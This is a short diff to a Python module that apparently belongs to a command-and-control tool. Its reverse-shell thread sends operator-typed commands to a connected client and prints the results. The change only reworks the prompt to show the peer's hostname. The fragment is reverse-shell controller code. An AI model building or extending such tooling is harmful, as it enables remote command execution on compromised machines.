@@ -2,6 +2,8 @@
 import subprocess
 import threading
 
+from colorama import Style
+
 from Server.console_handler import command_finished
 
 requires_id = True
@@ -14,12 +16,13 @@ def execute(conn, args, clients, id):
 
 
 def rshell_thread(conn):
+    hostname = conn.getpeername()[0]
     while True:
-        command = input("Enter command for reverse shell (type exit to leave the reverse shell): ")
+        command = input("<" + hostname + ">:" + Style.RESET_ALL)
         if command.lower() == 'exit':
             command_finished.set()
             break
         conn.sendall(command.encode())
         results = conn.recv(1024)
-        print("Received results: {}".format(results.decode('utf-8')))
+        print("<" + hostname + ">: {}".format(results.decode('utf-8')))
 
